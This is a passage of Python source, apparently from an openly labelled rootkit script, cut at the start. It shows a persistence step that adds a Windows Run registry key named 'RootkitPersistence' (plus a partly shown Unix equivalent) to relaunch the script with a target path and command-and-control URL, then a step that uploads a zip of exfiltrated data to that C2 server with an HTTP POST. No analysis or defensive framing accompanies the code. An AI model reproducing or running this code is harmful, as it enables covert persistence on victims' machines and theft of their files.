            f.write(f'python3 {__file__} {target_path} {c2_url}\n')
    elif os.name == 'nt':
        # Windows
        registry_key = r'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
        subprocess.run(['reg', 'add', registry_key, '/v', 'RootkitPersistence', '/t', 'REG_SZ', '/d', f'python {__file__} {target_path} {c2_url}'])

    # Step 5: Communicate with C2 server
    with open(exfiltrated_data_path, 'rb') as f:
        files = {'file': ('exfiltrated_data.zip', f)}
        response = requests.post(c2_url, files=files)
        print(f'C2 Response: {response.status_code}')
